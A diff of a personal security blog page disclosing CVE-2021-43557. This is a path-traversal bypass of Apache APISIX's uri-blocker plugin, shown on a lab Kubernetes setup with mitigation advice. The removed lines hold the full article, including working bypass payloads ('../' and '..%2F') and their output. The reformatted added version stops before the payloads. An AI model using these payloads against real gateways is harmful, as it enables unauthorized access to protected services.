@@ -1,200 +1,90 @@
-<!doctype html><html><head>
-<meta charset=utf-8>
-<meta http-equiv=x-ua-compatible content="IE=edge"><title>CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable - xvnpw personal blog</title><meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=description content="In this article I will present my research on insecure usage of $request_uri variable in Apache APISIX ingress controller. My work end up in submit of security vulnerability, which was positively confirmed and got CVE-2021-43557. At the end of article I will mention in short Skipper which I tested for same problem.
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable - xvnpw personal blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="In this article I will present my research on insecure usage of $request_uri variable in Apache APISIX ingress controller. My work end up in submit of security vulnerability, which was positively confirmed and got CVE-2021-43557. At the end of article I will mention in short Skipper which I tested for same problem.
 What is APISIX ? From official website:
- Apache APISIX is a dynamic, real-time, high-performance API gateway. APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.">
-<meta property="og:image" content>
-<meta property="og:title" content="CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable">
-<meta property="og:description" content="In this article I will present my research on insecure usage of $request_uri variable in Apache APISIX ingress controller. My work end up in submit of security vulnerability, which was positively confirmed and got CVE-2021-43557. At the end of article I will mention in short Skipper which I tested for same problem.
+ Apache APISIX is a dynamic, real-time, high-performance API gateway. APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more."><meta property="og:image" content><meta property="og:title" content="CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable"><meta property="og:description" content="In this article I will present my research on insecure usage of $request_uri variable in Apache APISIX ingress controller. My work end up in submit of security vulnerability, which was positively confirmed and got CVE-2021-43557. At the end of article I will mention in short Skipper which I tested for same problem.
 What is APISIX ? From official website:
- Apache APISIX is a dynamic, real-time, high-performance API gateway. APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://xvnpw.github.io/posts/cve_2021_43557_apache_apisix_path_traversal_in_request_uri_variable/"><meta property="article:section" content="posts">
-<meta property="article:published_time" content="2021-11-22T20:59:02+01:00">
-<meta property="article:modified_time" content="2021-11-22T20:59:02+01:00">
-<meta name=twitter:card content="summary">
-<meta name=twitter:title content="CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable">
-<meta name=twitter:description content="In this article I will present my research on insecure usage of $request_uri variable in Apache APISIX ingress controller. My work end up in submit of security vulnerability, which was positively confirmed and got CVE-2021-43557. At the end of article I will mention in short Skipper which I tested for same problem.
+ Apache APISIX is a dynamic, real-time, high-performance API gateway. APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more."><meta property="og:type" content="article"><meta property="og:url" content="https://xvnpw.github.io/posts/cve_2021_43557_apache_apisix_path_traversal_in_request_uri_variable/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-11-22T20:59:02+01:00"><meta property="article:modified_time" content="2021-11-22T20:59:02+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable"><meta name=twitter:description content="In this article I will present my research on insecure usage of $request_uri variable in Apache APISIX ingress controller. My work end up in submit of security vulnerability, which was positively confirmed and got CVE-2021-43557. At the end of article I will mention in short Skipper which I tested for same problem.
 What is APISIX ? From official website:
- Apache APISIX is a dynamic, real-time, high-performance API gateway. APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.">
-<script src=https://xvnpw.github.io/js/feather.min.js></script>
-<link href=https://xvnpw.github.io/css/fonts.b685ac6f654695232de7b82a9143a46f9e049c8e3af3a21d9737b01f4be211d1.css rel=stylesheet>
-<link rel=stylesheet type=text/css media=screen href=https://xvnpw.github.io/css/main.2f9b5946627215dc1ae7fa5f82bfc9cfcab000329136befeea5733f21e77d68f.css>
-<link id=darkModeStyle rel=stylesheet type=text/css href=https://xvnpw.github.io/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)">
-<link rel=stylesheet type=text/css href=https://xvnpw.github.io/css/my.6c05193fd59255e7809f44153be743523b36838b781ff558a2ca5c9ce14a756e.css>
-</head>
-<body>
-<div class=content><header>
-<div class=main>
-<a href=https://xvnpw.github.io/>xvnpw personal blog</a>
-</div>
-<nav>
-<a href=/>Home</a>
+ Apache APISIX is a dynamic, real-time, high-performance API gateway. APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more."><script src=https://xvnpw.github.io/js/feather.min.js></script>
+<link href=https://xvnpw.github.io/css/fonts.b685ac6f654695232de7b82a9143a46f9e049c8e3af3a21d9737b01f4be211d1.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://xvnpw.github.io/css/main.2f9b5946627215dc1ae7fa5f82bfc9cfcab000329136befeea5733f21e77d68f.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://xvnpw.github.io/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=stylesheet type=text/css href=https://xvnpw.github.io/css/my.6c05193fd59255e7809f44153be743523b36838b781ff558a2ca5c9ce14a756e.css></head><body><div class=content><header><div class=main><a href=https://xvnpw.github.io/>xvnpw personal blog</a></div><nav><a href=/>Home</a>
 <a href=/posts>All posts</a>
 <a href=/about>About</a>
-<a href=/tags>Tags</a>
-</nav>
-</header>
-<main>
-<article>
-<div class=title>
-<h1 class=title>CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable</h1>
-<div class=meta>Posted on Nov 22, 2021</div>
-</div>
-<section class=body>
-<figure class=image-center><img src=https://user-images.githubusercontent.com/17719543/139592951-0fafc921-437e-4bb7-b0ee-199dd72b36c3.png>
-</figure>
-<p>In this article I will present my research on insecure usage of <code>$request_uri</code> variable in <a href=https://github.com/apache/apisix-ingress-controller/>Apache APISIX</a> ingress controller. My work end up in submit of security vulnerability, which was positively confirmed and got CVE-2021-43557. At the end of article I will mention in short <a href=https://github.com/zalando/skipper>Skipper</a> which I tested for same problem.</p>
-<p>What is APISIX ? From official website:</p>
-<blockquote>
-<p>Apache APISIX is a dynamic, real-time, high-performance API gateway.
-APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.</p>
-</blockquote>
-<p>Why <code>$request_uri</code> ? This <a href=https://nginx.org/en/docs/http/ngx_http_core_module.html#var_request_uri>variable</a> is many times used in authentication and authorization plugins. It&rsquo;s <strong>not normalized</strong>, so giving a possibility to bypass some restrictions.</p>
-<p>In Apache APISIX there is no typical functionality of external authentication/authorization. You can write your own plugin, but it&rsquo;s quite complicated. To prove that APISIX is vulnerable to path-traversal I will use <code>uri-blocker</code> plugin. I&rsquo;m suspecting that other plugins are also vulnerable but this one is easy to use.</p>
-<h2 id=setting-thestage>Setting the stage</h2>
-<p>Install APISIX into Kubernetes. Use helm chart with version <strong>0.7.2</strong>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>helm repo add apisix https://charts.apiseven.com
-helm repo add bitnami https://charts.bitnami.com/bitnami
-helm repo update
-kubectl create ns ingress-apisix
-helm install apisix apisix/apisix <span style=color:#ae81ff>\
-</span><span style=color:#ae81ff></span>  --set gateway.type<span style=color:#f92672>=</span>NodePort <span style=color:#ae81ff>\
-</span><span style=color:#ae81ff></span>  --set ingress-controller.enabled<span style=color:#f92672>=</span>true <span style=color:#ae81ff>\
-</span><span style=color:#ae81ff></span>  --namespace ingress-apisix <span style=color:#ae81ff>\
-</span><span style=color:#ae81ff></span>  --version 0.7.2
-kubectl get service --namespace ingress-apisix
-</code></pre></div><p>In case of problems follow <a href=https://github.com/apache/apisix-ingress-controller/blob/master/docs/en/latest/deployments/minikube.md>official guide</a>.</p>
-<p>To create <em>ingress route</em>, you need to deploy <code>ApisixRoute</code> resource:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>apisix.apache.org/v2beta1</span>
-<span style=color:#f92672>kind</span>: <span style=color:#ae81ff>ApisixRoute</span>
-<span style=color:#f92672>metadata</span>:
-  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>public-service-route</span>
-<span style=color:#f92672>spec</span>:
-  <span style=color:#f92672>http</span>:
-  - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>public-service-rule</span>
-    <span style=color:#f92672>match</span>:
-      <span style=color:#f92672>hosts</span>:
-      - <span style=color:#ae81ff>app.test</span>
-      <span style=color:#f92672>paths</span>:
-      - <span style=color:#ae81ff>/public-service/*</span>
-    <span style=color:#f92672>backends</span>:
-        - <span style=color:#f92672>serviceName</span>: <span style=color:#ae81ff>public-service</span>
-          <span style=color:#f92672>servicePort</span>: <span style=color:#ae81ff>8080</span>
-    <span style=color:#f92672>plugins</span>:
-      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>proxy-rewrite</span>
-        <span style=color:#f92672>enable</span>: <span style=color:#66d9ef>true</span>
-        <span style=color:#f92672>config</span>:
-          <span style=color:#f92672>regex_uri</span>: [<span style=color:#e6db74>&#34;/public-service/(.*)&#34;</span>, <span style=color:#e6db74>&#34;/$1&#34;</span>]
-  - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>protected-service-rule</span>
-    <span style=color:#f92672>match</span>:
-      <span style=color:#f92672>hosts</span>:
-      - <span style=color:#ae81ff>app.test</span>
-      <span style=color:#f92672>paths</span>:
-      - <span style=color:#ae81ff>/protected-service/*</span>
-    <span style=color:#f92672>backends</span>:
-        - <span style=color:#f92672>serviceName</span>: <span style=color:#ae81ff>protected-service</span>
-          <span style=color:#f92672>servicePort</span>: <span style=color:#ae81ff>8080</span>
-    <span style=color:#f92672>plugins</span>:
-      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>uri-blocker</span>
-        <span style=color:#f92672>enable</span>: <span style=color:#66d9ef>true</span>
-        <span style=color:#f92672>config</span>:
-          <span style=color:#f92672>block_rules</span>: [<span style=color:#e6db74>&#34;^/protected-service(/?).*&#34;</span>]
-          <span style=color:#f92672>case_insensitive</span>: <span style=color:#66d9ef>true</span>
-      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>proxy-rewrite</span>
-        <span style=color:#f92672>enable</span>: <span style=color:#66d9ef>true</span>
-        <span style=color:#f92672>config</span>:
-          <span style=color:#f92672>regex_uri</span>: [<span style=color:#e6db74>&#34;/protected-service/(.*)&#34;</span>, <span style=color:#e6db74>&#34;/$1&#34;</span>]
-</code></pre></div><p>Let&rsquo;s dive deep into it:</p>
-<ul>
-<li>it creates routes for <code>public-service</code> and <code>private-service</code></li>
-<li>there is <code>proxy-rewrite</code> turned on to remove prefixes</li>
-<li>there is <code>uri-blocker</code> plugin configured for <code>protected-service</code>. It can look like mistake but this plugin it about to block any requests starting with <code>/protected-service</code> 😀</li>
-</ul>
-<h2 id=exploitation>Exploitation</h2>
-<p>I&rsquo;m using APISIX in version <strong>2.10.0</strong>.</p>
-<p>Reaching out to APISIX routes in minikube is quite inconvenient: <code>kubectl exec -it -n ${namespace of Apache APISIX} ${Pod name of Apache APISIX} -- curl --path-as-is http://127.0.0.1:9080/public-service/public -H 'Host: app.test'</code>. To ease my pain I will write small script that will work as template:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#/bin/bash</span>
-
-kubectl exec -it -n ingress-apisix apisix-dc9d99d76-vl5lh -- curl --path-as-is http://127.0.0.1:9080$1 -H <span style=color:#e6db74>&#39;Host: app.test&#39;</span>
-</code></pre></div><p>In your case replace <code>apisix-dc9d99d76-vl5lh</code> with name of actual APISIX pod.</p>
-<p>Let&rsquo;s start with validation if routes and plugins are working as expected:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./apisix_request.sh <span style=color:#e6db74>&#34;/public-service/public&#34;</span>
-Defaulted container <span style=color:#e6db74>&#34;apisix&#34;</span> out of: apisix, wait-etcd <span style=color:#f92672>(</span>init<span style=color:#f92672>)</span>
-<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;data&#34;</span>:<span style=color:#e6db74>&#34;public data&#34;</span><span style=color:#f92672>}</span>
-</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./apisix_request.sh <span style=color:#e6db74>&#34;/protected-service/protected&#34;</span>
-Defaulted container <span style=color:#e6db74>&#34;apisix&#34;</span> out of: apisix, wait-etcd <span style=color:#f92672>(</span>init<span style=color:#f92672>)</span>
-&lt;html&gt;
-&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
-&lt;body&gt;
-&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
-&lt;hr&gt;&lt;center&gt;openresty&lt;/center&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre></div><p>Yep. <code>public-service</code> is available and <code>protected-service</code> is blocked by plugin.</p>
-<p>Now let&rsquo;s test payloads:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./apisix_request.sh <span style=color:#e6db74>&#34;/public-service/../protected-service/protected&#34;</span>
-Defaulted container <span style=color:#e6db74>&#34;apisix&#34;</span> out of: apisix, wait-etcd <span style=color:#f92672>(</span>init<span style=color:#f92672>)</span>
-<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;data&#34;</span>:<span style=color:#e6db74>&#34;protected data&#34;</span><span style=color:#f92672>}</span>
-</code></pre></div><p>and second one:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ./apisix_request.sh <span style=color:#e6db74>&#34;/public-service/..%2Fprotected-service/protected&#34;</span>
-Defaulted container <span style=color:#e6db74>&#34;apisix&#34;</span> out of: apisix, wait-etcd <span style=color:#f92672>(</span>init<span style=color:#f92672>)</span>
-<span style=color:#f92672>{</span><span style=color:#e6db74>&#34;data&#34;</span>:<span style=color:#e6db74>&#34;protected data&#34;</span><span style=color:#f92672>}</span>
-</code></pre></div><p>As you can see in both cases I was able to bypass uri restrictions 😄</p>
-<h3 id=root-cause>Root cause</h3>
-<p><code>uri-blocker</code> plugin is using <code>ctx.var.request_uri</code> variable in logic of making blocking decision. You can check it in <a href=https://github.com/apache/apisix/blob/11e7824cee0e4ab0145ea7189d991464ade3682a/apisix/plugins/uri-blocker.lua#L98>code</a>:</p>
-<figure><img src=https://user-images.githubusercontent.com/17719543/140750129-f32e9acc-2f4b-42d9-b565-d52d44fe0504.png>
-</figure>
-<h3 id=impact>Impact</h3>
-<ul>
-<li>attacker can bypass access control restrictions and perform successful access to routes that shouldn&rsquo;t be able to,</li>
-<li>developers of custom plugins have no knowledge that <code>ngx.var.request_uri</code> variable is untrusted.</li>
-</ul>
-<p>Search for usage of <code>var.request_uri</code> gave me a hint that maybe <a href=https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/authz-keycloak.md>authz-keycloak plugin</a> is affected. You can see <a href=https://github.com/apache/apisix/blob/a3d42e66f60673e408cab2e2ceedc58aee450776/apisix/plugins/authz-keycloak.lua#L578>this code</a>, it looks really nasty. If there is no normalization on keycloak side, then there is high potential for vulnerablity.</p>
-<h3 id=mitigation>Mitigation</h3>
-<p>In case of custom plugins, I suggest to do path normalization before using <code>ngx.var.request_uri</code> variable. There are also two other variables, high probably normalized, to check <code>ctx.var.upstream_uri</code> and <code>ctx.var.uri</code>.</p>
-<h2 id=skipper>Skipper</h2>
-<p>Skipper is another ingress controller that I have investigated. It&rsquo;s not easy to install it in kubernetes, because deployment guide and helm charts are outdated. Luckily I have found issue page where developer was describing how to install it. This ingress gives possibility to implement external authentication based on <a href=https://opensource.zalando.com/skipper/reference/filters/#webhook>webhook filter</a>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>networking.k8s.io/v1</span>
-<span style=color:#f92672>kind</span>: <span style=color:#ae81ff>Ingress</span>
-<span style=color:#f92672>metadata</span>:
-  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>my-ingress</span>
-  <span style=color:#f92672>annotations</span>:
-    <span style=color:#f92672>zalando.org/skipper-filter</span>: |<span style=color:#e6db74>
-</span><span style=color:#e6db74>      </span>      <span style=color:#ae81ff>modPath(&#34;^/.*/&#34;, &#34;/&#34;) -&gt; setRequestHeader(&#34;X-Auth-Request-Redirect&#34;, &#34;${request.path}&#34;) -&gt; webhook(&#34;http://auth-service.default.svc.cluster.local:8080/verify&#34;)</span>
-</code></pre></div><p>To add some interesting headers that could help in access control decision, you need to do it manually with <code>setRequestHeader</code> filter. There is template available to inject variable by <code>${}</code>. Sadly (for attackers) <code>${request.path}</code> is having normalized path 😐 I see in code that developers are not using <em>easily</em> <code>RequestURI</code> or <code>originalRequest</code>.</p>
-<p>I wasn&rsquo;t able to exploit path traversal in this case. Skipper remains safe.</p>
-<h2 id=summary>Summary</h2>
-<p>Apache APISIX is vulnerable for path traversal. It&rsquo;s not affecting any external authentication, but plugins that are using <code>ctx.var.request_uri</code> variable.</p>
-<p>Whole code of this example is here <a href=https://github.com/xvnpw/k8s-CVE-2021-43557-poc>https://github.com/xvnpw/k8s-CVE-2021-43557-poc</a>.</p>
-<h3 id=other-articles-from-this-series>Other articles from this series</h3>
-<ul>
-<li><a href=https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_traefik_and_haproxy/>Path traversal in authorization context in Traefik and HAProxy</a></li>
-<li><a href=https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_emissary/>Path traversal in authorization context in Emissary</a></li>
-<li><a href=https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_kong_and_f5_nginx/>Path traversal in authorization context in Kong and F5 NGINX</a></li>
-<li><a href=https://xvnpw.github.io/posts/bug_bounty_tips_for_nginx_request_uri_path_traversal_bypass/>Bug bounty tips for nginx $request_uri path traversal bypass</a></li>
-<li><a href=https://xvnpw.github.io/posts/hunting_for_buggy_authentication_authorization_services_on_github/>Hunting for buggy authentication/authorization services on github</a></li>
-</ul>
-<hr>
-<p>Thanks for reading! You can follow me on <a href=https://twitter.com/xvnpw>Twitter</a>.</p>
-</section>
-<div class=post-tags>
-<nav class="nav tags">
-<ul class=tags>
-<li><a href=/tags/kubernetes>kubernetes</a></li>
-<li><a href=/tags/ingress>ingress</a></li>
-<li><a href=/tags/apisix>apisix</a></li>
-<li><a href=/tags/path-traversal>path-traversal</a></li>
-</ul>
-</nav>
-</div>
-</article>
-</main>
-<footer>
-<hr><a class=soc href=https://github.com/xvnpw title=GitHub><i data-feather=github></i></a>|<a class=soc href=https://twitter.com/xvnpw title=Twitter><i data-feather=twitter></i></a>|⚡️
-2021 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a>
-</footer>
-<script>feather.replace()</script></div>
-</body>
-</html>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable</h1><div class=meta>Posted on Nov 22, 2021</div></div><section class=body><figure class=image-center><img src=https://user-images.githubusercontent.com/17719543/139592951-0fafc921-437e-4bb7-b0ee-199dd72b36c3.png></figure><p>In this article I will present my research on insecure usage of <code>$request_uri</code> variable in <a href=https://github.com/apache/apisix-ingress-controller/>Apache APISIX</a> ingress controller. My work end up in submit of security vulnerability, which was positively confirmed and got CVE-2021-43557. At the end of article I will mention in short <a href=https://github.com/zalando/skipper>Skipper</a> which I tested for same problem.</p><p>What is APISIX ? From official website:</p><blockquote><p>Apache APISIX is a dynamic, real-time, high-performance API gateway.
+APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.</p></blockquote><p>Why <code>$request_uri</code> ? This <a href=https://nginx.org/en/docs/http/ngx_http_core_module.html#var_request_uri>variable</a> is many times used in authentication and authorization plugins. It&rsquo;s <strong>not normalized</strong>, so giving a possibility to bypass some restrictions.</p><p>In Apache APISIX there is no typical functionality of external authentication/authorization. You can write your own plugin, but it&rsquo;s quite complicated. To prove that APISIX is vulnerable to path-traversal I will use <code>uri-blocker</code> plugin. I&rsquo;m suspecting that other plugins are also vulnerable but this one is easy to use.</p><h2 id=setting-thestage>Setting the stage</h2><p>Install APISIX into Kubernetes. Use helm chart with version <strong>0.7.2</strong>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>helm repo add apisix https://charts.apiseven.com
+</span></span><span style=display:flex><span>helm repo add bitnami https://charts.bitnami.com/bitnami
+</span></span><span style=display:flex><span>helm repo update
+</span></span><span style=display:flex><span>kubectl create ns ingress-apisix
+</span></span><span style=display:flex><span>helm install apisix apisix/apisix <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  --set gateway.type<span style=color:#f92672>=</span>NodePort <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  --set ingress-controller.enabled<span style=color:#f92672>=</span>true <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  --namespace ingress-apisix <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  --version 0.7.2
+</span></span><span style=display:flex><span>kubectl get service --namespace ingress-apisix
+</span></span></code></pre></div><p>In case of problems follow <a href=https://github.com/apache/apisix-ingress-controller/blob/master/docs/en/latest/deployments/minikube.md>official guide</a>.</p><p>To create <em>ingress route</em>, you need to deploy <code>ApisixRoute</code> resource:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>apisix.apache.org/v2beta1</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>kind</span>: <span style=color:#ae81ff>ApisixRoute</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>metadata</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>public-service-route</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>spec</span>:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>http</span>:
+</span></span><span style=display:flex><span>  - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>public-service-rule</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>match</span>:
+</span></span><span style=display:flex><span>      <span style=color:#f92672>hosts</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#ae81ff>app.test</span>
+</span></span><span style=display:flex><span>      <span style=color:#f92672>paths</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#ae81ff>/public-service/*</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>backends</span>:
+</span></span><span style=display:flex><span>        - <span style=color:#f92672>serviceName</span>: <span style=color:#ae81ff>public-service</span>
+</span></span><span style=display:flex><span>          <span style=color:#f92672>servicePort</span>: <span style=color:#ae81ff>8080</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>plugins</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>proxy-rewrite</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>enable</span>: <span style=color:#66d9ef>true</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>config</span>:
+</span></span><span style=display:flex><span>          <span style=color:#f92672>regex_uri</span>: [<span style=color:#e6db74>&#34;/public-service/(.*)&#34;</span>, <span style=color:#e6db74>&#34;/$1&#34;</span>]
+</span></span><span style=display:flex><span>  - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>protected-service-rule</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>match</span>:
+</span></span><span style=display:flex><span>      <span style=color:#f92672>hosts</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#ae81ff>app.test</span>
+</span></span><span style=display:flex><span>      <span style=color:#f92672>paths</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#ae81ff>/protected-service/*</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>backends</span>:
+</span></span><span style=display:flex><span>        - <span style=color:#f92672>serviceName</span>: <span style=color:#ae81ff>protected-service</span>
+</span></span><span style=display:flex><span>          <span style=color:#f92672>servicePort</span>: <span style=color:#ae81ff>8080</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>plugins</span>:
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>uri-blocker</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>enable</span>: <span style=color:#66d9ef>true</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>config</span>:
+</span></span><span style=display:flex><span>          <span style=color:#f92672>block_rules</span>: [<span style=color:#e6db74>&#34;^/protected-service(/?).*&#34;</span>]
+</span></span><span style=display:flex><span>          <span style=color:#f92672>case_insensitive</span>: <span style=color:#66d9ef>true</span>
+</span></span><span style=display:flex><span>      - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>proxy-rewrite</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>enable</span>: <span style=color:#66d9ef>true</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>config</span>:
+</span></span><span style=display:flex><span>          <span style=color:#f92672>regex_uri</span>: [<span style=color:#e6db74>&#34;/protected-service/(.*)&#34;</span>, <span style=color:#e6db74>&#34;/$1&#34;</span>]
+</span></span></code></pre></div><p>Let&rsquo;s dive deep into it:</p><ul><li>it creates routes for <code>public-service</code> and <code>private-service</code></li><li>there is <code>proxy-rewrite</code> turned on to remove prefixes</li><li>there is <code>uri-blocker</code> plugin configured for <code>protected-service</code>. It can look like mistake but this plugin it about to block any requests starting with <code>/protected-service</code> 😀</li></ul><h2 id=exploitation>Exploitation</h2><p>I&rsquo;m using APISIX in version <strong>2.10.0</strong>.</p><p>Reaching out to APISIX routes in minikube is quite inconvenient: <code>kubectl exec -it -n ${namespace of Apache APISIX} ${Pod name of Apache APISIX} -- curl --path-as-is http://127.0.0.1:9080/public-service/public -H 'Host: app.test'</code>. To ease my pain I will write small script that will work as template:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#/bin/bash</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>kubectl exec -it -n ingress-apisix apisix-dc9d99d76-vl5lh -- curl --path-as-is http://127.0.0.1:9080$1 -H <span style=color:#e6db74>&#39;Host: app.test&#39;</span>
+</span></span></code></pre></div><p>In your case replace <code>apisix-dc9d99d76-vl5lh</code> with name of actual APISIX pod.</p><p>Let&rsquo;s start with validation if routes and plugins are working as expected:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./apisix_request.sh <span style=color:#e6db74>&#34;/public-service/public&#34;</span>
+</span></span><span style=display:flex><span>Defaulted container <span style=color:#e6db74>&#34;apisix&#34;</span> out of: apisix, wait-etcd <span style=color:#f92672>(</span>init<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;data&#34;</span>:<span style=color:#e6db74>&#34;public data&#34;</span><span style=color:#f92672>}</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ./apisix_request.sh <span style=color:#e6db74>&#34;/protected-service/protected&#34;</span>
+</span></span><span style=display:flex><span>Defaulted container <span style=color:#e6db74>&#34;apisix&#34;</span> out of: apisix, wait-etcd <span style=color:#f92672>(</span>init<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>&lt;html&gt;
+</span></span><span style=display:flex><span>&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
+</span></span><span style=display:flex><span>&lt;body&gt;
+</span></span><span style=display:flex><span>&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
+</span></span><span style=display:flex><span>&lt;hr&gt;&lt;center&gt;openresty&lt;/center&gt;
+</span></span><span style=display:flex><span>&lt;/body&gt;
+</span></span><span style=display:flex><span>&lt;/html&gt;
